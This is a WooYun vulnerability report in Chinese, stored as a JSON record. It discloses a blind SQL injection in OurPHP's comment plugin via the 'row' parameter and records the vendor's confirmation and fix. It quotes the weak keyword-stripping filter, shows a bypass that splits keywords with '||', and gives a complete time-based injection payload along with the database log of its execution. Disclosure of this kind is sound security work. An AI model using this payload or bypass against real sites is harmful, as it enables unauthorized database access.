{"id": 82905, "wybug_id": "wooyun-2015-0149584", "wybug_title": "ourphp最新版sql盲注#1", "wybug_corp": "ourphp.net", "wybug_author": "不能忍", "wybug_date": "2015-10-27 12:22", "wybug_open_date": "2015-12-17 14:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "11", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-17：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 感谢@xser大牛 详细说明：  漏洞文件:/function/plugs/Comment/product-content.php由于文件比较大，代码比较多，我就只贴了关键的代码。\n$OP_Class = isset($_GET['id'])?$_GET['id']:\"0\";$OP_Type = isset($_GET['type'])?$_GET['type']:\"productview\";$OP_Row = isset($_GET['row'])?$_GET['row']:\"10\";\n这上面是获取参数的代码,下面来看看进库：\n$sql=\"select * from `ourphp_comment` where OP_Class = \".intval($OP_Class).\" && OP_Type = '\".dowith_sql($OP_Type).\"' order by time desc LIMIT 0,\".dowith_sql($OP_Row);\n$OP_Class这个是没戏了,$OP_Type这个过不了addslashes，$OP_Row这个被一个dowith_sql的函数保护着，我们来看看dowith_sql函数:\nfunction dowith_sql($ourphpstr){   $ourphpstr = addslashes($ourphpstr);   $ourphpstr = str_ireplace(\"and\",\"　and\",$ourphpstr);   $ourphpstr = str_ireplace(\"or\",\"　or\",$ourphpstr);   $ourphpstr = str_ireplace(\"execute\",\"ourphp\",$ourphpstr);   $ourphpstr = str_ireplace(\"update\",\"ourphp\",$ourphpstr);   $ourphpstr = str_ireplace(\"count\",\"ourphp\",$ourphpstr);   $ourphpstr = str_ireplace(\"chr\",\"ourphp\",$ourphpstr);   $ourphpstr = str_ireplace(\"mid\",\"ourphp\",$ourphpstr);   $ourphpstr = str_ireplace(\"master\",\"ourphp\",$ourphpstr);   $ourphpstr = str_ireplace(\"truncate\",\"ourphp\",$ourphpstr);   $ourphpstr = str_ireplace(\"char\",\"ourphp\",$ourphpstr);   $ourphpstr = str_ireplace(\"declare\",\"ourphp\",$ourphpstr);   $ourphpstr = str_ireplace(\"select\",\"ourphp\",$ourphpstr);   $ourphpstr = str_ireplace(\"create\",\"ourphp\",$ourphpstr);   $ourphpstr = str_ireplace(\"delete\",\"ourphp\",$ourphpstr);   $ourphpstr = str_ireplace(\"insert\",\"ourphp\",$ourphpstr);   $ourphpstr = str_ireplace(\"&&\",\"\",$ourphpstr);   $ourphpstr = str_ireplace(\"||\",\"\",$ourphpstr);   $ourphpstr = str_ireplace(\"%\",\"\\%\",$ourphpstr);   $ourphpstr = str_ireplace(\"_\",\"\\_\",$ourphpstr);   $ourphpstr = str_ireplace(\"alert\",\"ourphp\",$ourphpstr);   $ourphpstr = str_ireplace(\"md5\",\"ourphp\",$ourphpstr);   $ourphpstr = str_ireplace(\"script\",\"ourphp\",$ourphpstr);   $ourphpstr = str_ireplace(\"iframe\",\"ourphp\",$ourphpstr);   return $ourphpstr;}\n这个绕过是xser大牛告诉我的，其实也很简单，就是没想到。注意这两行： \n$ourphpstr = str_ireplace(\"&&\",\"\",$ourphpstr);   $ourphpstr = str_ireplace(\"||\",\"\",$ourphpstr);\n根据这两行可以构造出payload:row=10 PROCEDURE analyse((sel||ect extractvalue(ran||d(),concat(0x3a,(IF(SUBSTRING(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)这样去掉||后还是能够正常注入的，而且还绕过了这个函数。由于不回显，所以这里只能盲注了。利用方法可以参考p牛之前发的一篇文章（作者好像是一个老外，不过p牛那边有更详细的，而且还是中文捏！）   漏洞证明：  \n\n看看mysql监控：2015/10/26 16:28\tselect * from `ourphp_comment` where OP_Class = 8 && OP_Type = 'productview' order by time desc LIMIT 0,10 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(SUBSTRING(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)   修复方案：     版权声明：转载请注明来源 不能忍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-10-31 15:04 厂商回复： 谢谢 最新状态： 2016-01-29：v1.5.0以修复此BUG 谢谢作者 感谢您  ", "replys": "漏洞评价：\n评价\n     2015-10-27 12:29 |    \t\t不能忍 \t\t\t( 实习白帽子  |\t\t\t        Rank:80 漏洞数:41        | 要是能重来，我要选李白!)\t\t \n  忘记给出p牛那篇文章的地址补个：https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}